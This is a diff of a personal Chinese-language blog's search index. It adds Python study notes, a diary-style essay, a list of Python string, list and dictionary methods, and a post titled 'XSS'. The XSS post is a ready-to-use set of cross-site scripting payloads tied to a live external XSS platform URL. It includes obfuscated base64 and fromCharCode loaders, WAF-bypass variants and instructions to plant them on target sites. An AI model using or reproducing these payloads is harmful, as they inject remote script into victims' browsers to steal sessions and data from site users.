+        #函数作用 
+        return 
+
+
+    #主程序中：
+    import name
+</code></pre>
+<h3 id="异常捕获"><a href="#异常捕获" class="headerlink" title="异常捕获"></a>异常捕获</h3><pre><code class="python">    try:
+        action
+    except errimfomation:
+        explaination
+    except ···：
+        more 
+</code></pre>
+<h3 id="class"><a href="#class" class="headerlink" title="class"></a>class</h3><p>a example:</p>
+<pre><code class="python">class SKB(object):
+    color = &quot;green&quot;
+    hands = 2
+    def __init__(self,COLOR,HANDS):
+        #初始化
+        self.color=COLOR
+        self.hands=HANDS
+    def dahulu(self):
+        print(&quot;轰······&quot;)
+        #  &quot;number%d&quot; %(number)
+    def jiaobian(self):
+        print(&quot;我没有&quot;)
+    def myaihao(self):
+        print(&quot;傻逼SKB&quot;)
+
+mysheyou = SKB(&quot;green&quot;,2)
+mysheyou.dahulu()
+mysheyou.myaihao()
+mysheyou.jiaobian()
+</code></pre>
+<h3 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h3><h4 id="python获取代码"><a href="#python获取代码" class="headerlink" title="python获取代码"></a>python获取代码</h4><pre><code class="python">import urllib.request  
+
+class GetHtml(object):
+    def __init__(self, URL,HEAD):  
+        self.url = URL
+        self.head=HEAD
+
+    def get_index(self):
+        self.request = urllib.request.Request(self.url)
+        self.request.add_header(&quot;user-agent&quot;,self.head)
+        self.response=urllib.request.urlopen(self.request)
+        return self.response.read()
+
+html = GetHtml(&quot;https://siren.blue&quot;,&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&quot;)
+print(html.get_index()) 
+</code></pre>
+<h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><pre><code class="python">#re模块
+&quot;&quot;&quot;
+.       单个字符匹配
+[]      括号内的内容会被逐一匹配
+\d      匹配单个数字
+\w      [0-9a-zA-Z]
+\s      空白字符 空格 tab
+*       匹配左邻字符出现0次或多次
++       左邻字符出现一次或多次
+?       左邻字符出现一次或0次
+&#123;n,m&#125;   左邻字符出现n 到 m次
+^       以什么字符串开头
+$       以什么字符串结尾
+()\\1   括号内保存 分组保存
+&quot;&quot;&quot;
+re.findall(&quot;.x&quot;,&quot;&quot;)
+re.findall(&quot;[Gf]ood&quot;,&quot;&quot;)
+re.findall(&quot;hello&quot;,&quot;&quot;)# 直接匹配
+re.findall(&quot;Good｜food&quot;,&quot;&quot;)
+re.findall(&quot;go*gle&quot;,&quot;i like google not ggle goooogle and gogle&quot;)
+re.findall(&quot;go+gle&quot;,&quot;&quot;)
+re.findall(&quot;style/\w&#123;60&#125;.jpg&quot;,&quot;&quot;)
+</code></pre>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -1011,6 +1052,65 @@ curl -X POST https://www.example.com
       </categories>
       <tags>
         <tag>动态规划</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>应是天仙狂醉，乱把白云揉碎</title>
+    <url>/2023/04/18/%E5%BA%94%E6%98%AF%E5%A4%A9%E4%BB%99%E7%8B%82%E9%86%89%EF%BC%8C%E4%B9%B1%E6%8A%8A%E7%99%BD%E4%BA%91%E6%8F%89%E7%A2%8E/</url>
+    <content><![CDATA[<blockquote>
+<p>人是一根会思想的苇草</p>
+</blockquote>
+<p>这是一场非正式会谈，我与我的。</p>
+<p>我这一生最讨厌三种人，欺骗、不守约定、孰若无睹，事实上，无比憎恨。</p>
+<p>想必这和我的经历有关，但我也不愿提及，就此散去吧。</p>
+<p>忽然想来，18年来，没有一日不彷徨无知，我还未曾真正瞧过自己一眼，或许瞧过，未曾入眼。</p>
+<p>讨厌的事情总是莫名其妙，就好像我不喜欢下雨，却又喜欢淋雨，或许这就是我的归宿，我也无力改变，但是我又的的确确要做些什么。倘若什么都不做，任由雨打满身，那也有点可悲，我不惧雨淋，不惧湿身，但也要在淋雨时迎风跑起，让那雨更猛烈的捶打着我，下次再遇见这雨，可就亲切又自然了。</p>
+<p>雨淋多了，总是会生病的。可能我也病了，我也不例外，这世界上病的人当然很多，病的千奇百怪，却没有人与我相似。在迷茫中寻求希望，未免是有点天真无知的。我不妄想希望的存在，我想成为自己的希望，千真万确。虽然听起来，更像是妄想。</p>
+<p>我又何尝不知我是在画地为牢，那又如何，属于我的一隅之地，也容许我孤芳自赏，这里不因是我的囚笼，这是我的天堂，我孤身起舞，不辜负我孤傲的人生。</p>
+<blockquote>
+<p>2023 4 18 萃文楼<br> 无法顶格空格的事，姑且下次再谈吧</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>日常</category>
+      </categories>
+      <tags>
+        <tag>不是好事</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XSS</title>
+    <url>/2023/04/16/XSS/</url>
+    <content><![CDATA[<p><a href="https://xss.yt/index/user.html">XSS平台</a></p>
+<pre><code class="bash">将如下代码植入怀疑出现xss的地方（注意&#39;的转义），即可在 项目内容 观看XSS效果。
+
+当前项目URL地址为：https://xss.yt/YLgl        【注意新增https，插入对方网站代码前缀http或者https都可】
+
+&lt;/tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC=//xss.yt/YLgl&gt;&lt;/sCrIpT&gt;
+或者
+
+&#39;&quot;&gt;&lt;input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnl0L1lMZ2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus&gt;
+&#39;&quot;&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnl0L1lMZ2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))&gt;
+&#39;&quot;&gt;&lt;video&gt;&lt;source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnl0L1lMZ2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7&gt;
+&#39;&quot;&gt;&lt;script&gt;function b()&#123;eval(this.responseText)&#125;;a=new XMLHttpRequest();a.addEventListener(&quot;load&quot;, b);a.open(&quot;GET&quot;, &quot;https://xss.yt/YLgl&quot;);a.send();&lt;/script&gt;
+&lt;img src=x onerror=s=createElement(&#39;script&#39;);body.appendChild(s);s.src=&#39;//xss.yt/YLgl&#39;;&gt;
+下方XSS代码过一般WAF [注意如果直接把代码放入Burp，111则需要把下方代码进行URL编码]
+
+&lt;embed src=https://xss.yt/liuyan/xs.swf?a=e&amp;c=docu0075ment.write(Stu0072ing.fromu0043harCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,115,46,121,116,47,89,76,103,108,62,60,47,115,67,114,73,112,84,62)) allowscriptaccess=always type=application/x-shockwave-flash&gt;&lt;/embed&gt;
+若使用下方XSS代码请注意(下面代码会引起网页空白不得已慎用，注意如果使用下面的代码，一定要勾选&quot;基础默认XSS&quot;模块)
+
+&lt;img src=&quot;&quot; onerror=&quot;document.write(String.fromCharCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,115,46,121,116,47,89,76,103,108,62,60,47,115,67,114,73,112,84,62))&quot;&gt;
+↓↓↓！~极限代码~！(可以不加最后的&gt;回收符号，下面代码已测试成功)↓↓↓
+
+&lt;sCRiPt/SrC=//xss.yt/YLgl&gt;
+</code></pre>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>xss</tag>
       </tags>
   </entry>
   <entry>
@@ -1049,27 +1149,90 @@ curl -X POST https://www.example.com
       </tags>
   </entry>
   <entry>
-    <title>应是天仙狂醉，乱把白云揉碎</title>
-    <url>/2023/04/18/%E5%BA%94%E6%98%AF%E5%A4%A9%E4%BB%99%E7%8B%82%E9%86%89%EF%BC%8C%E4%B9%B1%E6%8A%8A%E7%99%BD%E4%BA%91%E6%8F%89%E7%A2%8E/</url>
-    <content><![CDATA[<blockquote>
-<p>人是一根会思想的苇草</p>
-</blockquote>
-<p>这是一场非正式会谈，我与我的。</p>
-<p>我这一生最讨厌三种人，欺骗、不守约定、孰若无睹，事实上，无比憎恨。</p>
-<p>想必这和我的经历有关，但我也不愿提及，就此散去吧。</p>
-<p>忽然想来，18年来，没有一日不彷徨无知，我还未曾真正瞧过自己一眼，或许瞧过，未曾入眼。</p>
-<p>讨厌的事情总是莫名其妙，就好像我不喜欢下雨，却又喜欢淋雨，或许这就是我的归宿，我也无力改变，但是我又的的确确要做些什么。倘若什么都不做，任由雨打满身，那也有点可悲，我不惧雨淋，不惧湿身，但也要在淋雨时迎风跑起，让那雨更猛烈的捶打着我，下次再遇见这雨，可就亲切又自然了。</p>
-<p>雨淋多了，总是会生病的。可能我也病了，我也不例外，这世界上病的人当然很多，病的千奇百怪，却没有人与我相似。在迷茫中寻求希望，未免是有点天真无知的。我不妄想希望的存在，我想成为自己的希望，千真万确。虽然听起来，更像是妄想。</p>
-<p>我又何尝不知我是在画地为牢，那又如何，属于我的一隅之地，也容许我孤芳自赏，这里不因是我的囚笼，这是我的天堂，我孤身起舞，不辜负我孤傲的人生。</p>
-<blockquote>
-<p>2023 4 18 萃文楼<br> 无法顶格空格的事，姑且下次再谈吧</p>
-</blockquote>
+    <title>pythonlist</title>
+    <url>/2023/04/21/pythonlist/</url>
+    <content><![CDATA[<h4 id="str"><a href="#str" class="headerlink" title="str"></a>str</h4><ul>
+<li><code>capitalize()</code> - 将字符串的第一个字符大写，其余字符小写</li>
+<li><code>casefold()</code> - 返回一个区分大小写的等效字符串</li>
+<li><code>center(width[, fillchar])</code> - 将字符串居中，使用指定字符填充两侧</li>
+<li><code>count(sub[, start[, end]])</code> - 计算子字符串在字符串中出现的次数</li>
+<li><code>encode(encoding=&#39;utf-8&#39;, errors=&#39;strict&#39;)</code> - 对字符串进行编码</li>
+<li><code>endswith(suffix[, start[, end]])</code> - 检查字符串是否以给定的子字符串结尾</li>
+<li><code>expandtabs(tabsize=8)</code> - 将字符串中的制表符替换为指定数量的空格</li>
+<li><code>find(sub[, start[, end]])</code> - 查找子字符串在字符串中首次出现的位置，如果未找到则返回 -1</li>
+<li><code>format(*args, **kwargs)</code> - 使用指定值替换字符串中的占位符</li>
+<li><code>format_map(mapping)</code> - 使用字典替换字符串中的占位符</li>
+<li><code>index(sub[, start[, end]])</code> - 类似于 find()，但如果未找到子字符串，会引发 ValueError</li>
+<li><code>isalnum()</code> - 检查字符串是否只包含字母和数字</li>
+<li><code>isalpha()</code> - 检查字符串是否只包含字母</li>
+<li><code>isascii()</code> - 检查字符串是否只包含 ASCII 字符</li>
+<li><code>isdecimal()</code> - 检查字符串是否只包含十进制数字</li>
+<li><code>isdigit()</code> - 检查字符串是否只包含数字字符</li>
+<li><code>isidentifier()</code> - 检查字符串是否是有效的 Python 标识符</li>
+<li><code>islower()</code> - 检查字符串中的字母是否都是小写</li>
+<li><code>isnumeric()</code> - 检查字符串是否只包含数值字符</li>
+<li><code>isprintable()</code> - 检查字符串是否只包含可打印字符</li>
+<li><code>isspace()</code> - 检查字符串是否只包含空白字符</li>
+<li><code>istitle()</code> - 检查字符串是否为标题格式（每个单词首字母大写，其余字母小写）</li>
+<li><code>isupper()</code> - 检查字符串中的字母是否都是大写</li>
+<li><code>join(iterable)</code> - 使用字符串作为连接符，将可迭代对象中的元素连接成一个新字符串</li>
+<li><code>ljust(width[, fillchar])</code> - 返回一个左对齐的字符串，并使用指定字符填充右侧</li>
+<li><code>lower()</code> - 将字符串中的所有字符转换为小写</li>
+<li><code>lstrip([chars])</code> - 移除字符串左侧的空白字符或指定字符</li>
+<li><code>maketrans(x[, y[, z]])</code> - 为字符串的 translate() 方法生成一个映射表</li>
+<li><code>partition(sep)</code> - 将字符串分割为一个 3 元组 (head, sep, tail)，head 是分隔符前的子串，sep 是分隔符本身，tail 是分隔符后的子串</li>
+<li><code>replace(old, new[, count])</code> - 将字符串中的 <code>old</code> 替换为 <code>new</code>，可指定替换次数</li>
+<li><code>rfind(sub[, start[, end]])</code> - 查找子字符串在字符串中最后一次出现的位置，如果未找到则返回 -1</li>
+<li><code>rindex(sub[, start[, end]])</code> - 类似于 rfind()，但如果未找到子字符串，会引发 ValueError</li>
+<li><code>rjust(width[, fillchar])</code> - 返回一个右对齐的字符串，并使用指定字符填充左侧</li>
+<li><code>rpartition(sep)</code> - 从右侧开始将字符串分割为一个 3 元组 (head, sep, tail)</li>
+<li><code>rsplit(sep=None, maxsplit=-1)</code> - 从右侧开始使用指定分隔符将字符串拆分为子字符串列表，可指定最大拆分次数</li>
+<li><code>rstrip([chars])</code> - 移除字符串右侧的空白字符或指定字符</li>
+<li><code>split(sep=None, maxsplit=-1)</code> - 使用指定分隔符将字符串拆分为子字符串列表，可指定最大拆分次数</li>
+<li><code>splitlines([keepends])</code> - 将字符串按行拆分为一个列表，可选择是否保留换行符</li>
+<li><code>startswith(prefix[, start[, end]])</code> - 检查字符串是否以给定的子字符串开头</li>
+<li><code>strip([chars])</code> - 移除字符串两端的空白字符或指定字符</li>
+<li><code>swapcase()</code> - 将字符串中的大小写字母互换</li>
+<li><code>title()</code> - 将字符串中的每个单词的首字母大写，其余字母小写</li>
+<li><code>translate(table)</code> - 使用指定的映射表替换字符串中的字符</li>
+<li><code>upper()</code> - 将字符串中的所有字符转换为大写</li>
+<li><code>zfill(width)</code> - 用零填充字符串的左侧，使其达到指定宽度</li>
+</ul>
+<h4 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h4><ul>
+<li><code>count(value)</code> - 计算指定值在元组中出现的次数</li>
+<li><code>index(value[, start[, end]])</code> - 返回指定值在元组中首次出现的索引，可以指定查找范围，如果未找到则抛出 ValueError</li>
+</ul>
+<h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><ul>
+<li><code>append(item)</code> - 在列表末尾添加一个元素</li>
+<li><code>extend(iterable)</code> - 将一个可迭代对象的元素添加到列表末尾</li>
+<li><code>insert(index, item)</code> - 在指定索引处插入一个元素</li>
+<li><code>remove(value)</code> - 移除列表中首次出现的指定值，如果未找到则抛出 ValueError</li>
+<li><code>pop([index])</code> - 移除并返回指定索引处的元素，默认移除并返回列表最后一个元素</li>
+<li><code>clear()</code> - 移除列表中的所有元素</li>
+<li><code>index(value[, start[, end]])</code> - 返回指定值在列表中首次出现的索引，可以指定查找范围，如果未找到则抛出 ValueError</li>
+<li><code>count(value)</code> - 计算指定值在列表中出现的次数</li>
+<li><code>sort(key=None, reverse=False)</code> - 对列表元素进行排序，可指定排序键和排序顺序</li>
+<li><code>reverse()</code> - 反转列表中的元素顺序</li>
+<li><code>copy()</code> - 返回列表的一个浅拷贝</li>
+</ul>
+<h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><ul>
+<li><code>clear()</code> - 移除字典中的所有元素</li>
+<li><code>copy()</code> - 返回字典的一个浅拷贝</li>
+<li><code>get(key[, default])</code> - 返回字典中指定键的值，如果键不存在，则返回默认值（默认为 None）</li>
+<li><code>items()</code> - 返回一个包含字典所有键值对的视图对象</li>
+<li><code>keys()</code> - 返回一个包含字典所有键的视图对象</li>
+<li><code>values()</code> - 返回一个包含字典所有值的视图对象</li>
+<li><code>pop(key[, default])</code> - 移除并返回字典中指定键的值，如果键不存在，返回默认值（若未提供默认值，抛出 KeyError）</li>
+<li><code>popitem()</code> - 移除并返回字典中的一个键值对（从 Python 3.7 开始，为最后一个键值对），如果字典为空，抛出 KeyError</li>
+<li><code>setdefault(key[, default])</code> - 如果键不存在于字典中，则添加键并设置其值为默认值（默认为 None），返回该键对应的值</li>
+<li><code>update([other])</code> - 将一个字典（或其他可迭代映射类型）的键值对添加到当前字典中，若有重复的键，则覆盖原有键值对</li>
+</ul>
 ]]></content>
       <categories>
-        <category>日常</category>
+        <category>python</category>
       </categories>
       <tags>
-        <tag>不是好事</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
